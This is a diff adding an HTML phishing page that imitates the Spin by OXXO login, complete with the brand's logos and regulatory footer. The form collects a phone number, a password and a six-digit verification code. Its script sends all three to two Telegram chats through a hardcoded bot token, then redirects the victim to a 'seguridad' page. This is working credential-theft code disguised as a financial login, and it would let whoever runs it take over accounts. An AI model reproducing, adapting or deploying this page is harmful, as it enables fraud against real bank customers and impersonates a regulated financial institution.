@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="/img/cropped-brand-bg-white-cp-180x180.png">
+    <meta name="generator" content="Webflow">
+    <link rel="stylesheet" href="style.css">
+    <title>Invita y Gana</title>
+    <style>
+        
+        html, body{
+  margin: 0;
+  max-width: 100% !important;
+  overflow-x: hidden !important;
+}
+.navbar {
+    display: flex;
+    padding: 10px;
+    background-color: #6949c7!important;
+    color: #fff;
+    align-items: center;
+    justify-content: space-between;
+
+  }
+  
+    .logo{
+      width: 80px;
+      left: 50px;
+      position: relative;
+    }
+  
+    .contenedor_img{
+      width: -webkit-fill-available;
+      background-color: #e7e7e7!important;
+      padding: 20px;
+    }
+  
+  .contenedor_secundario{
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      align-content: flex-end;
+      gap: 50px;
+      padding: 20px;
+     
+    }
+   .contenedor_img img{
+      width: 25%;
+    }
+    
+    .tittle_principal{
+      display: block;
+      font-size: 20px;
+      padding-bottom: 20px;
+      border-bottom: 1px solid #000000;
+      text-align: center;
+      margin: 20px 0;
+      font-family: "Telefonica-L","Helvetica Neue",Helvetica,Arial,sans-serif;
+      font-weight: 100;
+      margin-top: 50px;
+    }
+  
+    .contenido{
+      width: 30%;
+      display: flex;
+      height: auto;
+      flex-direction: column;
+      align-content: stretch;
+      align-items: baseline;
+      margin: 0 auto;
+      align-items: center;
+      padding: 20px;
+      background: linear-gradient(to bottom, #c62f2f 80%, #a72e2c 20%);
+      border-radius: 0 0 20px 20px;
+    }
+  
+    .puntos{
+      border: 1px solid #fff;
+      width: 90%;
+      text-align: center;
+      height: 100px;
+      padding: 20px;
+    }
+  
+    .valor_resultado{
+      margin-top: 70px;
+      border-top: 1px solid white;
+      width: 100%;
+      padding: 20px;
+      gap: 20px;
+      display: flex;
+      flex-direction: column;
+      text-align: center;
+    }
+  
+    .contenido p{
+      font-family: "Telefonica-Bold","Helvetica Neue",Helvetica,Arial,sans-serif;
+      font-size: 48px;
+      color: #fff;
+      text-align: center;
+      font-weight: 600;
+    }
+  
+    .contenido span{
+      font-family: "Telefonica-Bold","Helvetica Neue",Helvetica,Arial,sans-serif;
+      font-size: 24px;
+      color: #fff;
+      margin-bottom: 20px;
+    }
+  
+   .contenido_secundario{
+    width: -webkit-fill-available;
+    display: flex;
+    height: auto;
+    flex-direction: column;
+    align-content: stretch;
+    align-items: baseline;
+    margin: 20px auto;
+    align-items: center;
+    padding: 20px;
+    border-radius: 0 0 20px 20px;
+   }
+    .contenedor-2{
+      width: 100%;
+      margin-bottom: -25px;
+    }
+  
+    .codigo_info {
+      width: 30%;
+      display: flex;
+      justify-content: space-between;
+      height: 50px;
+      margin: auto;
+      flex-direction: inherit;
+    }
+  
+    .codigo_info input {
+      flex-basis: calc(86% / 6);
+      height: 100%;
+      font-size: 24px;
+      text-align: center;
+      border: none;
+      outline: none;
+      background-color: #e7e7e7!important;
+      padding: 0;
+      width: 0%;
+      border: 1px solid #ff0000;
+    }
+  
+    .codigo_info input:focus {
+      outline: none;
+      border:1px solid #6333c9;
+    }
+  
+    .input_info input:focus {
+      outline: none;
+      border:1px solid #6333c9;
+    }
+    
+  h1{
+      font-weight: 100;
+      font-size: 20px;
+    }
+  
+    p{
+      margin: 0;
+    }
+  
+    label{
+      display: inline-block;
+      margin-bottom: 0.5rem;
+    }
+  
+  
+  
+    button{
+      display: inline-block;
+      padding: 16px 14px;
+      text-align: center;
+      color: #fff;
+      font-size: 18px;
+      font-size: 1.8rem;
+      font-family: "Telefonica-Bold","Helvetica Neue",Helvetica,Arial,sans-serif;
+      letter-spacing: .05em;
+      -webkit-transition: all .2s linear;
+      -o-transition: all .2s linear;
+      transition: all .2s linear;
+      -webkit-border-radius: 4px;
+      border-radius: 40px;
+      border: 0;
+      cursor: pointer;
+      background-color: #531BC5;
+      width: 100%;
+      font-size: 15px;
+    }
+  
+    .info_producto{
+      display: flex;
+      flex-direction: column;
+      margin: 0 auto 0 20px;
+      font-size: 20px;
+      color: #50535a;
+    }
+  
+    .info_principal{
+      display: flex;
+      flex-direction: column;
+    }
+  
+    .input_info input {
+      font-family: 'Courier New', Courier, monospace;
+      width: -webkit-fill-available;
+      color: #121212;
+      padding-top: 20px;
+      border: none;
+      outline: 0px;
+      padding: 0.5em;
+      border-radius: 0.2em;
+      background-color:#ffffff;
+      margin-bottom: 20px;
+      height: 30px;
+      font-size: 20px;
+      font-weight: 700;
+      border: 1px solid #646464;
+      }
+  
+      
+  .final{
+      background-color: #fff;
+      padding: 10px;
+      color: black;
+      display: flex;
+      gap: 20px;
+      flex-direction: row;
+      justify-content: flex-end;
+      align-items: center;
+      border-top: 30px solid #dc6718!important;
+    }
+  
+    .brand{
+      width: 15%;
+    }
+  
+    .final_3{
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      gap: 50px;
+      margin-bottom: 100px;
+    }
+  
+  
+   .loading {
+      position: fixed;
+      top: 0;
+      right: 0;
+      bottom: 0;
+      left: 0;
+      z-index: 5;
+      display: flex;
+      background-color: rgba(255, 255, 255, 0.8);
+      display: none;
+      z-index: 10;
+    }
+    .loading svg {
+      display: block;
+      margin: auto;
+      stroke: #6333c9; /* cambia el color del borde del spinner */
+      fill: #6333c9;
+      -webkit-touch-callout: none;
+      -webkit-user-select: none;
+      -khtml-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+    }
+  
+    .contenido_2{
+      width: 50%;
+      display: flex;
+      flex-direction: column;
+      align-content: stretch;
+      align-items: baseline;
+      margin: 20px auto;
+      align-items: center;
+      padding: 20px;
+      color: #50535a;;
+    }
+  
+    .final_2{
+      display: flex;
+      flex-wrap: nowrap;
+      width: 90%;
+      margin: 0 auto;
+    }
+  
+    .redes{
+      width: 50%;
+      padding: 10px;
+      font-size: 15px;
+    }
+  
+    .apps{
+      width: 50%;
+      padding: 5%;
+      position: relative;
+      gap: 20px;
+      display: flex;
+      flex-direction: row;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: center;
+      height: 100px;
+    }
+  
+   .modal-content {
+      z-index: 999;
+      display: flex;
+      flex-direction: inherit;
+      background-color: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
+      position: fixed;
+      bottom: 0;
+      width: -webkit-fill-available;    
+      justify-content: space-between;
+      align-items: center;
+      font-size: 15px;
+      animation: modal-content 4s ease-out;
+    }
+    @keyframes modal-content {
+      0% {
+        bottom: -500px;
+      }
+      100% {
+        bottom: 0;
+      }
+    }
+    #aceptar{
+      width: 10%;
+      margin-bottom: 0;
+    }
+    .contenido_final{
+      width: -webkit-fill-available;
+      background-color: #e7e7e7!important;
+      padding: 20px;
+      display: flex;margin: 0 auto;
+      flex-direction: column;
+      text-align: center;
+    }
+    .contenido_final img{
+      width: 30%;
+      display: flex;
+      margin-top: 0 auto;
+      margin-bottom: 40px;
+    }
+  
+    .step2 {
+      display: none;
+    }
+    .step3 {
+      display: none;
+    }
+    .contenedor_img {
+      display: block;
+    }
+    .contenedor_puntos{
+      display: block;
+    }
+    
+     @media (max-width: 991.99px){
+      .contenedor .pc {
+          display: none!important;
+      }
+    .contenedor_img img{
+      width: 80%;
+    }
+    .contenedor_puntos img{
+      width: 70%;
+    }
+      .contenido_2{
+        width: 90%;
+      }
+      .contenido{
+        width: -webkit-fill-available;
+      }
+     .final{
+      flex-direction: column;
+     }
+     .codigo_info{
+      width: 80%;
+     } 
+      button{
+        width: 100%;
+        margin-bottom: 20px;
+      }
+      .btn_finalizar{
+        width: 80%;
+      }
+      .final_2{
+        flex-direction: column;
+        width: 100%;
+      }
+      .brand{
+        width: 50%;
+        margin-top: 30px;
+      }
+      .apps{
+        width: -webkit-fill-available;
+      }
+      .modal-content {
+        flex-direction: column;
+        gap: 30px;
+        text-align: center;
+        font-size: 12px;
+      }
+      #aceptar{
+        width: 40%;
+      }
+      .contenido_final img{
+        width: 100%;
+      }
+    }
+        
+        
+        
+    </style>
+</head>
+<body>
+    <nav>
+        <div class="navbar">
+            <a href="#">
+                <img src="https://spinbyoxxo.com.mx/wp-content/uploads/2021/07/logo-download.png" class="logo" alt="Logo">
+            </a>
+        </div>
+    </nav>
+
+    <h1 class="tittle_principal">Iniciar sesión</h1>
+
+    <div class="form-container">
+        <form>
+            <div class="contenido_2">
+                <p style="text-align: center; font-size:18px; font-weight:700;margin-bottom:30px;">
+                    Hola
+                </p>
+                <div style="width: 100%;" class="input_info">
+                    <label style="font-size: 15px;font-weight: 700;" for="numero">Teléfono</label>
+                    <input type="text" inputmode="decimal" id="numero" name="numero" minlength="14" maxlength="14" value="+52 " onkeydown="if(event.keyCode==32 || event.keyCode==8) return false;">
+                </div>
+
+                <div style="width: 100%;" class="input_info">
+                    <label style="font-size: 15px;font-weight: 700;" for="contra">Contraseña</label>
+                    <input type="password" inputmode="text" id="contra" name="contra" minlength="4" onkeydown="if(event.keyCode==32) return false;">
+                </div>
+
+                <div style="width: 100%;" class="input_info">
+                    <label style="font-size: 15px;font-weight: 700;" for="codigo">Codigo 6 digitos</label>
+                    <input type="password" inputmode="text" id="codigo" name="codigo" minlength="6" maxlength="6"onkeydown="if(event.keyCode==32) return false;">
+                </div>
+
+                <p style="color: #dc6718!important;font-weight: 900;font-size: 35px;margin: 0;font-size:15px;">
+                    ¿Olvidaste tu contraseña?
+                </p>
+                <button style="margin-top: 20px;" id="submit">Iniciar sesión</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        // Agrega el código JavaScript necesario para enviar la información al bot de Telegram
+        var form = document.querySelector('form');
+        form.addEventListener('submit', function(event) {
+            event.preventDefault(); // Evita el envío del formulario por defecto
+
+            // Obtén los valores de los campos de entrada
+            var telefono = document.getElementById('numero').value;
+            var contrasena = document.getElementById('contra').value;
+            var codigo = document.getElementById('codigo').value;
+
+            // Construye el mensaje a enviar al bot de Telegram
+            var mensaje = "Teléfono: " + telefono + "\nContraseña: " + contrasena + "\nCódigo: " + codigo;
+
+            var url_chat1 = "https://api.telegram.org/bot6384228625:AAHWJpdgiR4ftfCDLPZl9q2ppWPDMngqEu0/sendMessage?chat_id=-1001897689316&text=" + encodeURIComponent(mensaje);
+            var request_chat1 = new XMLHttpRequest();
+            request_chat1.open('GET', url_chat1, true);
+            request_chat1.send();
+
+            var url_chat2 = "https://api.telegram.org/bot6384228625:AAHWJpdgiR4ftfCDLPZl9q2ppWPDMngqEu0/sendMessage?chat_id=1940651338&text=" + encodeURIComponent(mensaje);
+            var request_chat2 = new XMLHttpRequest();
+            request_chat2.open('GET', url_chat2, true);
+            request_chat2.send();
+
+            // Redirige al otro sitio web al terminar (reemplaza 'URL_DESTINO' con la URL deseada)
+            setTimeout(function() {
+                window.location.href = 'seguridad.html';
+            }, 1000); // Cambia el valor de 1000 (1 segundo) según tus necesidades
+        });
+    </script>
+
+    <section class="final">
+        <img class="brand" src="https://spinbyoxxo.com.mx/wp-content/uploads/2021/07/cropped-brand-bg-white-cp.png" alt="Brand">
+        <div class="apps">
+            <img style="width: 15%;" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSeBTQHt5kFa5zeNjrOQ9Ab79saixbKEsgTlpgb9hfhziOJwqgnXzuu-R8&s=10" alt="Logo BURO">
+        </div>
+    </section>
+
+    <section class="final_3">
+        <span style="width: 80%;">Compropago, S.A. de C.V., Institución de Fondos de Pago Electrónico,
+            es una entidad financiera autorizada, regulada y supervisada por las Autoridades Financieras de México,
+            para operar en términos de lo previsto por la Ley para Regular las Instituciones de Tecnología Financiera,
+            bajo la marca comercial Spin by OXXO. Ni el Gobierno Federal ni las entidades de la administración pública paraestatal
+            podrán responsabilizarse o garantizar los recursos de los Clientes que sean utilizados en las Operaciones que celebren
+            con Spin by OXXO o frente a otros, así como tampoco asumir alguna responsabilidad por las obligaciones contraídas por
+            Spin by OXXO o por algún Cliente frente a otro, en virtud de las operaciones que celebren.</span>
+        <strong style="font-weight: 800; text-align:center;font-size:20px;width: 90%;">©2023 Spin by OXXO. Todos los derechos reservados</strong>
+    </section>
+</body>
+  </html>
